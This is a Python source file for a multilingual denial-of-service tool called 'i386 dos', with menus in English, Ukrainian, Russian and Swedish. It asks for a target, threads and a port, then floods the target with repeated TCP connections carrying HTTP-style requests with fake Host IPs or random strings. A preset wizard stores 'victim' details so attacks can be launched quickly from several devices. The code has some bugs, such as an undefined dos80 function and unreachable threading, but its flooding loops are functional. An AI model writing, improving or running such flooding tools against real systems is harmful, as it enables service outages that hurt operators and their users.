from colorama import Fore, Back, Style
from os import system, name
from faker import Faker
from time import sleep
import linecache
import colorama
import threading
import random
import socket
import string

#def var
inj = ""
size = 0
method = ""
reqcount = 0
port = int("0")
faker = Faker()
rngsize = int("0")
target = "192.168.0.1"

#clear screen
def clear():
	if name == "nt":
		_ = system('cls')
	else:
		_ = system('clear')

#show information
def info():
	global reqcount
	reqcount += 1
	print(str(reqcount) + " packets sent via port " + str(port))

#threading launch
def thr():
	for i in range(threads):
		thread = threading.Thread(target=dos)
		thread.start()

#inject fake ip
def dosfake():
	global reqcount
	global method
	global port
	while True:
		fake_ip = faker.ipv4()
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " " + method + "/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		info()
		s.close()
	thr()

#inject random string
def dosrng():
	global reqcount
	global method
	global port
	global size
	while True:
		rng = ''.join(random.choices(string.ascii_uppercase + string.digits, k = size))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " " + method + "/1.1\r\n").encode('ascii'), (target, port))
		s.sendto((rng).encode('ascii'), (target, port))
		info()
		s.close()
	thr()

#inject very random string
def dosrngsize():
	global reqcount
	global method
	global rngsize
	global port
	global size
	while True:
		size = random.randint(1, rngsize)
		rng = ''.join(random.choices(string.ascii_uppercase + string.digits, k = size))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " " + method + "/1.1\r\n").encode('ascii'), (target, port))
		s.sendto((rng).encode('ascii'), (target, port))
		info()
		s.close()
	thr()

def logo():
	print('''
██╗██████╗░░█████╗░░█████╗░
██║╚════██╗██╔══██╗██╔═══╝░
██║░█████╔╝╚█████╔╝██████╗░
██║░╚═══██╗██╔══██╗██╔══██╗
██║██████╔╝╚█████╔╝╚█████╔╝
╚═╝╚═════╝░░╚════╝░░╚════╝░

██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║░╚═══██╗
██████╔╝╚█████╔╝██████╔╝
╚═════╝░░╚════╝░╚═════╝░
''')


def credits():
	print(Fore.BLUE + Back.WHITE + '''
IIII"                       .IIII`                     ^IIII
IIII"                       .IIII`                     ^IIII
....                        .IIII`                     ^IIII
````'   '````  '^","^'.   ``^IIII,```                  ^IIII
IIII"   "IIII`;IIIIIIII^ .IIIIIIIIIII                  ^IIII
IIII"   "IIIII"`''^;IIII^ ..'IIII^...                  ^IIII
IIII"   "IIII.     .IIII:   .IIII`                     ^IIII
IIII"   "IIII       ;III:   .IIII`      .`^,:::,"`.    ^IIII
IIII"   "IIII       ;III:   .IIII`    ',IIIII;IIIII,'  ^IIII
IIII"   "IIII       ;III:   .IIII`   ^IIII`.   .';III` ^IIII
IIII"   "IIII       ;III:   .IIII,. `IIII`       .IIII`^IIII
IIII"   "IIII       ;III:    ;IIIII;IIIII;;;;;;;;;IIII;:IIII
,,,,^   ^,,,,       ",,,"    .`,:;;;IIIII,,,,,,,,,,,,,,,,,,,
                                    `IIII`                  
                                     ^IIII^.    ':III,      
                                      ':IIII;:;IIIII^       
                                        .`,;IIII:"'         

''')
	print(Style.RESET_ALL)

#idk i cant call this optimization
def clcredits():
	clear()
	credits()

#just to make it look nicer you know
def cllogo():
	clear()
	logo()





################################
###EN###EN###EN###EN###EN###EN##
################################
def enmenu():

#main en menu
	while True:
		logo()
		print("Menu:\n1 - Start simple DOS\n2 - Advanced DOS\n3 - Options\n4 - Credits\n5 - Exit")
		menu = input("Option number: ")
		
#start simple dos with info gather
		if(menu=="1"):
			cllogo()
			target = input("Target: ")
			threads = int(input("Enter how many threads: "))
			readdefport()

#advanced dos menu
		elif(menu=="2"):
			cllogo()
			print("Advanced DOS menu:\n1 - Start simple preset DOS\n2 - Start advanced DOS\n3 - Exit")
			advopt = input("Option number: ")

#start preset read func
			if(advopt == "1"):
				cllogo()
				getpreset()

#start advanced dos
			elif(advopt == "2"):
				cllogo()
				target = input("Target: ")
				global port
				port = int(input("Choose port. Ports available: 53, 80, 443, 8000, 8080. \nPort: "))
				threads = input("Enter how many threads: ")
				global inj
				while True:
					cllogo()
					inj = input("What to inject? A new injection will generate each time a packet is sent.\n1 - Fake ip\n2 - Random string of numbers and letters\nOption number: ")
					if(inj == "1"):
						portsw()
					elif(inj == "2"):
						cllogo()
						rngopt = int(input("Enter size of the string. 1 symbol = 1 byte. This is number is crucial, it can either make the attack very efficient or blow its cover.\n1 - Fixed amount of symbols\n2 - Random amount of symbols from 1 to X\nOption number: "))
						if(rngopt == 1):
							global size
							size = int(input("Enter size: "))
							portsw()
						elif(rngopt == 2):
							global rngsize
							rngsize = int(input("Enter max size: "))
							portsw()
						else:
							throwerr()
					else:
						throwerr()
						

#exit
			elif(advopt == "3"):
				clear()
			else:
				throwerr()

#options screen
		elif(menu=="3"):
			cllogo()
			print("Options:\n1 - Reset language\n2 - Create a target preset\n3 - Change default port\n4 - Exit")
			option = input("Option number: ")
			
#language reset
			if(option == "1"):
				cllogo()
				input("Note: this will reset default port to 80. Press Enter to proceed.")
				text_file = open("config.txt", "w")
				n = text_file.write("")
				text_file.close()
				print("Language reset.")

#force user to answer my dumb questions
				while True:
					res = input("Exit now? y/n: ")
					if(res=="y"):
						quit()
					elif(res=="n"):
						clear()
						break
					else:
						throwerr()
						logo()

#create new preset
			elif(option == "2"):
				cllogo()
				print("Welcome to preset wizard. This option is used rarely, but can come in handy if you need to execute the attack from a bunch of different devices fast. Please enter your targets information carefully.")
				filename = input("Preset name (only latin letters and numbers): ")
				print("Your preset will be written to " + filename + ".txt")
				f = open(filename + ".txt", "x")
				print(filename + ".txt was created.")
				
#get the info from the poor guy
				target = input("Target: ")
				print("Port is 80 by default.")
				threads = input("Enter how many threads: ")
				
#write to file
				f = open(filename + ".txt", "a")
				f.write(target + '''
''' + threads)
				f.close()
				clear()

#change default port
			elif(option == "3"):
				cllogo()
				global defport
				defport = input("Available ports as of v1.1: 53, 80, 443, 8000, 8080.\nNew default port: ")
				newdefport()

#exit
			elif(option == "4"):
				clear()
			else:
				throwerr()

#credits menu		
		elif(menu=="4"):
				clcredits()
				print('''275,000 transistors since 1985!\n"Man, this shits lightning fast!"\n''')
				print("Original DOS algorithm - neuralnine.com\nSwedish UI - u/4lphafallen\n")
				input("Press Enter to exit to main menu.")
				clear()

#halt program if 5	
		elif(menu=="5"):
				quit()
		else:
				throwerr()





################################
###UA###UA###UA###UA###UA###UA##
################################
def uamenu():

#main menu
	while True:
		cllogo()
		print("Меню:\n1 - Запустити простий DOS\n2 - Запустити продвинутий DOS\n3 - Налаштування\n4 - Подяки\n5 - Вихід")
		menu = input("Номер опції: ")
		
#simple dos with info gather
		if(menu=="1"):
			cllogo()
			target = input("Ціль: ")
			threads = int(input("Введіть кількість потоків: "))
			readdefport()

#advanced dos menu
		elif(menu=="2"):
			cllogo()
			print("Меню продвинутого DOS:\n1 - Запустити простий DOS з шаблону\n2 - Запустити продвинутий DOS\n3 - Вийти")
			advopt = input("Номер опції: ")

#start preset read func
			if(advopt == "1"):
				cllogo()
				getpreset()

#start advanced dos
			elif(advopt == "2"):
				cllogo()
				target = input("IP цілі: ")
				threads = input("Введіть кількість потоків: ")
				port = int(input("Виберіть порт. Доступні порти в цій програмі: 53, 80, 443, 8000, 8080.\nВаш вибір: "))
				portsw()

#exit
			elif(advopt == "3"):
				clear()
			else:
				throwerr()

#options screen
		elif(menu=="3"):
			cllogo()
			print("Налаштування:\n1 - Скинути мову\n2 - Зробити шаблон цілі\n3 - Задати новий порт за замовчуванням\n4 - Вихід")
			option = input("Номер опції: ")
			
#language reset
			if(option == "1"):
				cllogo()
				input("Увага: це також скине порт за замовчуванням до 80. Нажміть Enter щоб продовжити. ")
				text_file = open("config.txt", "w")
				n = text_file.write("")
				text_file.close()
				print("Скидання мови успішне.")

#force user to answer my dumb questions
				while True:
					res = input("Вийти зараз? y - так, n - ні: ")
					if(res=="y"):
						quit()
					elif(res=="n"):
						clear()
						break
					else:
						throwerr()
						logo()
			
#create new preset
			elif(option == "2"):
				cllogo()
				print("Ласкаво просимо до мастера створення шаблонів. Ця можливість рідко використовується, але може знадобитись якщо ви хочете запустити атаку з декількох різних пристроїв швидко. Будь ласка, вводіть інформацію жертви обережно.")
				filename = input("Ім'я нового шаблону (тільки латиниця і цифри): ")
				print("Ваш шаблон буде записаний до файлу " + filename + ".txt")
				f = open(filename + ".txt", "x")
				print(filename + ".txt створений.")
				
#get the info from the poor guy
				target = input("Ціль: ")
				print("Порт є 80 за замовчуванням.")
				threads = input("Введіть кількість потоків: ")
				
#write variables 
				f = open(filename + ".txt", "a")
				f.write(target + '''
''' + threads)
				f.close()
				clear()
				
			elif(option == "3"):
				cllogo()
				global defport
				defport = input("Можливі порти в версії v1.1: 53, 80, 443, 8000, 8080.\nНовий порт за замовчуванням: ")
				newdefport()
				
			elif(option == "4"):
				clear()
			else:
				throwerr()
				
		elif(menu=="4"):
				clcredits()
				print('''275,000 транзисторів з 1985 року!\n"Чувак, ця хрінь швидка як молнія!"\n''')
				print("Оригінальній алгоритм DOS - neuralnine.com\nШведська мова - u/4lphafallen\n")
				input("Натисніть Enter щоб вийти у меню. Слава Україні!")
				clear()	
		elif(menu=="5"):
				quit()
		else:
				throwerr()
				
				
				
				

								
################################
###RU###RU###RU###RU###RU###RU##
################################
def rumenu():
	while True:
		cllogo()
		print("Меню:\n1 - Запустить простой DOS\n2 - Продвинутый DOS\n3 - Настройки\n4 - Отдельное спасибо\n5 - Выход")
		menu = input("Номер опции: ")
		
#start dos with info gather
		if(menu=="1"):
			cllogo()
			target = input("Цель: ")
			threads = input("Введите количество потоков: ")
			readdefport()

#interpret preset variables
		elif(menu=="2"):
			cllogo()
			print("Меню продвинутого DOS:\n1 - Запустить простой DOS с шаблона\n2 - Запустить продвинутый DOS\n3 - Выйти")
			advopt = input("Номер опции: ")
			if(advopt == "1"):
				cllogo()
				getpreset()
			elif(advopt == "2"):
				cllogo()
				target = input("IP цели: ")
				threads = input("Введите количество потоков: ")
				port = int(input("Выбери порт. Доступные порты в этой программе: 53, 80, 443, 8000, 8080.\nВаш выбор: "))
				portsw()
			elif(advopt == "3"):
				clear()
			else:
				throwerr()
		elif(menu=="3"):
			cllogo()
			print("Настройки:\n1 - Сбросить язык\n2 - Создать шаблон\n3 - Выставить новый порт по умолчанию\n4 - Выход")
			option = input("Номер опции: ")

#language reset
			if(option == "1"):
				cllogo()
				input("Внимание: это также сбросит порт по умлочанию до 80. Нвдмите Enter чтобы продолжить. ")
				text_file = open("config.txt", "w")
				n = text_file.write("")
				text_file.close()
				print("Сброс языка успешен.")
				while True:
					res = input("Выйти сейчас? y - да, n - нет: ")
					if(res=="y"):
						quit()
					elif(res=="n"):
						clear()
						break
					else:
						throwerr()
						logo()

#preset write
			elif(option == "2"):
				cllogo()
				print("Добро пожаловать в мастер создания шаблонов. Эта возможность редко используется, но пригодится если нужно щапустить атаку с нескольких устройств быстро. Пожалуйста, вводите информацию жертвы аккуратно.")
				filename = input("Имя нового шаблона (только латиница і цифры): ")
				print("Ваш шаблон будет записан в файл " + filename + ".txt")
				f = open(filename + ".txt", "x")
				print(filename + ".txt создан.")

#lorem ispum and stuff
				target = input("Цель: ")
				print("Порт 80 по умолчанию.")
				threads = input("Введите количество потоков: ")
				
#write variables 
				f = open(filename + ".txt", "a")
				f.write(target + '''
''' + threads)
				f.close()
				clear()

			elif(option == "3"):
				cllogo()
				global defport
				defport = input("Возможные порты в версии v1.1: 53, 80, 443, 8000, 8080.\nНовый порт по умолчанию: ")
				newdefport()
				
			elif(option == "4"):
				clear()
			else:
				throwerr()
				
		elif(menu=="4"):
				clcredits()
				print('''275,000 транзисторов с 1985 года!\n"Чувак, эта херня молниеносна!"\n''')
				print("Оригинальный алгоритм DOS - neuralnine.com\nШведский интерфейс - u/4lphafallen\n")
				input("Нажмите Enter чтобы выйти в меню. Слава Украине!")
				clear()	
		elif(menu=="5"):
				quit()
		else:
				throwerr()
				





################################
###SE###SE###SE###SE###SE###SE###
################################
def semenu():
	while True:
		cllogo()
		print("Meny:\n1 - Starta enkel DOS\n2 - Avancerad DOS\n3 - Alternativ\n4 - Krediter\n5 - Avsluta")
		menu = input("Alternativ nummer: ")
		
#start dos with inf gather
		if(menu=="1"):
			cllogo()
			target = input("Mål: ")
			threads = input("Inmata hur många trådar: ")
			readdefport()

#interpret preset variables
		elif(menu=="2"):
			cllogo()
			print("Avancerad DOS meny:\n1 - Starta enkel förinställd DOS\n2 - Starta avancerad DOS\n3 - Avsluta")
			advopt = input("Alternativ nummer: ")
			if(advopt == "1"):
				cllogo()
				getpreset()
			elif(advopt == "2"):
				cllogo()
				target = input("Mål: ")
				port = int(input("Välj port. Porter tillgängliga: 53, 80, 443, 8000, 8080. \nPort: "))
				threads = input("Skriv in hur många trådar: ")
				portsw()
			elif(advopt == "3"):
				clear()
			else:
				throwerr()
		elif(menu=="3"):
			cllogo()
			print("Alternativ:\n1 - Återställ språk\n2 - Skapa en inriktad förinställning\n3 - Välj ny standard port\n4 - Avsluta")
			option = input("Alternativ nummer: ")
			
#language reset
			if(option == "1"):
				cllogo()
				input("Notering: det här kommer återställa standard porten till 80. Tryck Enter för att fortsätta. ")
				text_file = open("config.txt", "w")
				n = text_file.write("")
				text_file.close()
				print("Språk återställning.")
				while True:
					res = input("Avsluta nu? y/n: ")
					if(res=="y"):
						quit()
					elif(res=="n"):
						clear()
						break
					else:
						throwerr()
						logo()
			
#preset write
			elif(option == "2"):
				cllogo()
				print("Välkommen till förinställningsguiden. Den här inställningen är sällan använd, men kan bli nödvändig om du behöver verkställa attacken från flera olika enheter snabbt. Skriv in målets information väldigt noga.")
				filename = input("Förinställning namn (endast latinska bokstäver och siffror): ")
				print("Din förinställning kommer bli skriven till " + filename + ".txt")
				f = open(filename + ".txt", "x")
				print(filename + ".txt skapades.")
				
#elden ring sucks
				target = input("Mål: ")
				print("Port är 80 som standard.")
				threads = input("Inmata hur många trådar: ")
				
#write variables 
				f = open(filename + ".txt", "a")
				f.write(target + '''
''' + threads)
				f.close()
				clear()
			elif(option == "3"):
				cllogo()
				global defport
				defport = input("Porter tillgängliga i den här versionen: 53, 80, 443, 8000, 8080.\nNya standard port: ")
				newdefport()
			elif(option == "4"):
				clear()
			else:
				throwerr()
				
		elif(menu=="4"):
				clcredits()
				print('''275.000 transistorer sedan 1985!\n"Mannen, den här skiten är blixtsnabb!"\n''')
				print("Originala DOS algoritm - neuralnine.com\nSvenska UI - u/4lphafallen\n")
				input("Tryck Enter för att avsluta till menyn.")
				clear()	
		elif(menu=="5"):
				quit()
		else:
				throwerr()




################################
#SWITCHES AND SUCH###############
################################

#switch menus depending on language
def menusw():
	global defport
	defport = linecache.getline("config.txt", 2)
	defport = defport[:-1]
	if(lang == "en"):
		enmenu()
	elif(lang == "ua"):
		uamenu()
	elif(lang == "ru"):
		rumenu()
	elif(lang == "se"):
		semenu()		

#invalid option print & clear
def throwerr():			
	if(lang == "en"):
		print("Invalid option!")
		sleep(1)
		clear()
	elif(lang == "ua"):
		print("Неможливий вибір!")
		sleep(1)
		clear
	elif(lang == "ru"):
		print("Невозможный выбор!")
		sleep(1)
		clear()
	elif(lang == "se"):
		print("Ogiltigt alternativ.")
		sleep(1)
		clear()

#switch dosing algos depending on port chosen/got from .txt
def portsw():
	global method
	global port
	if(port == 53):
		method = "DNS"
		injsw()
	elif(port == 80 or port == 8000 or port == 8080):
		method = "HTTP"
		injsw()
	elif(port == 443):
		method = "HTTPS"
		injsw()
	else:
		throwerr()

#injection method switch
def injsw():
	global inj
	global rngsize
	if(inj == "1"):
		dosfake()
	elif(inj == "2"):
		if(rngsize>0):
			dosrngsize()
		elif(rngsize==0):
			dosrng()
		else:
			print("ERR: Couldnt switch brtween injection types!")
	else:
		throwerr()

#get all the necessary shit from .txt
def getpreset():
	if(lang == "en"):
		openname = input("Preset name: ") + ".txt"
	elif(lang == "ua"):
		openname = input("Ім'я шаблону: ") + ".txt"
	elif(lang == "ru"):
		openname = input("Имя шаблона: ") + ".txt"
	elif(lang == "se"):
		openname = input("Förinställning namn: ") + ".txt"
	target = linecache.getline(openname, 1)
	target = target[:-1]
	threads = linecache.getline(openname, 2)
	dos80()

#set new default port
def newdefport():
	global lang
	text_file = open("config.txt", "w")
	n = text_file.write("")
	text_file.close()
	f = open("config.txt", "a")
	f.write(lang + '''
''' + defport + '''
''')
	f.close()
	clear()

#read default port from file
def readdefport():
	global port
	port = linecache.getline("config.txt", 2)
	port = int(port[:-1])
	portsw()
	
#read language on start
lang = linecache.getline('config.txt', 1)
lang = lang[:-1]

#welcome screen n shit
if (lang == ""):
	logo()
	print("Welcome to i386 dos, my friend.\n\nWe trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things:\n\n# 1) Respect the privacy of others.\n# 2) Think before you type.\n# 3) With great power comes great responsibility.\n")

#set new language
	lang = input("Language/Мова/Язык/Språk \n   en     ua   ru   se\nPlease choose:")
	if(lang == "en"):
		save = input("Would you like to save your choice? y/n: ")
	elif(lang == "ua"):
		save = input("Чи бажаєте ви зберегти ваш вибір? y - так, n - ні: ")
	elif(lang == "ru"):
		save = input("Хотите ли вы сохранить свой выбор? y - да, n - нет: ")
	elif(lang == "se"):
		save = input("Vill du spara ditt val? y/n: ")

#save language
	if (save == "y"):
		text_file = open("config.txt", "w")
		n = text_file.write(lang + '''
''' + "80" + '''
''')
		text_file.close()
		clear()
		menusw()
	elif (save == "n"):
		clear()
		menusw()
		
#if its already saved, exit to menu
menusw()